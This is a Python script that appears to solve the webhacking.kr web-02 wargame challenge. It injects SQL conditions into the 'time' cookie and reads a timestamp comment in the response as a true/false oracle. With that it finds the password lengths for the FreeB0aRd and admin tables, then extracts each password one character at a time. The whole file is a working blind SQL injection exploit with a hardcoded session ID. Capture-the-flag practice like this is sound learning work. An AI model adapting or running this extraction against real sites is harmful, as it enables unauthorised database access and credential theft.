import urllib.request
from urllib.parse import quote

freeboard_length = 0
admin_length = 0
freeboard_key = ""
admin_key = ""

for i in range(1,100):
    url = "http://webhacking.kr/challenge/web/web-02/"
    re = urllib.request.Request(url)

    re.add_header(
        "User-agent",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
    re.add_header(
        "Cookie",
        "time=1515829547 and (select length(password) from FreeB0aRd)={};PHPSESSID=146468d32872268defce85d051d198b2".format(i)
    )

    req = urllib.request.urlopen(re)

    if str(req.read()).find("<!--2070-01-01 09:00:01-->") != -1:
        freeboard_length = i
        print("Length of Freeboard' pw is {}".format(freeboard_length))
        break

for i in range(1,100):
    url = "http://webhacking.kr/challenge/web/web-02/"
    re = urllib.request.Request(url)

    re.add_header(
        "User-agent",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
    re.add_header(
        "Cookie",
        "time=1515829547 and (select length(password) from admin)={};PHPSESSID=146468d32872268defce85d051d198b2".format(i)
    )

    req = urllib.request.urlopen(re)

    if str(req.read()).find("<!--2070-01-01 09:00:01-->") != -1:
        admin_length = i
        print("Length of Admin' pw is {}".format(admin_length))
        break

for i in range(1, freeboard_length+1):
    for j in range(32, 127):
        url = "http://webhacking.kr/challenge/web/web-02/"
        print("time=1515829547 and (select ascii(substring(password,{},1)) from admin)={};".format(i,j))
        re = urllib.request.Request(url)

        re.add_header(
            "User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
        re.add_header(
            "Cookie", "time=1515829547 and (select ascii(substring(password,{},1)) from FreeB0aRd)={};PHPSESSID=146468d32872268defce85d051d198b2".format(i,j)
        )

        req = urllib.request.urlopen(re)

        if str(req.read()).find("<!--2070-01-01 09:00:01-->") != -1:
            freeboard_key += chr(j).lower()
            print(freeboard_key)
            break


for i in range(1, admin_length+1):
    for j in range(32, 127):
        url = "http://webhacking.kr/challenge/web/web-02/"
        print("time=1515829547 and (select ascii(substring(password,{},1)) from admin)={};".format(i,j))
        re = urllib.request.Request(url)

        re.add_header(
            "User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
        re.add_header(
            "Cookie", "time=1515829547 and (select ascii(substring(password,{},1)) from admin)={};PHPSESSID=146468d32872268defce85d051d198b2".format(i,j)
        )

        req = urllib.request.urlopen(re)

        if str(req.read()).find("<!--2070-01-01 09:00:01-->") != -1:
            admin_key += chr(j)
            print(admin_key)
            break
print('freeboard_key is ' + freeboard_key)
print('admin_key is ' + admin_key)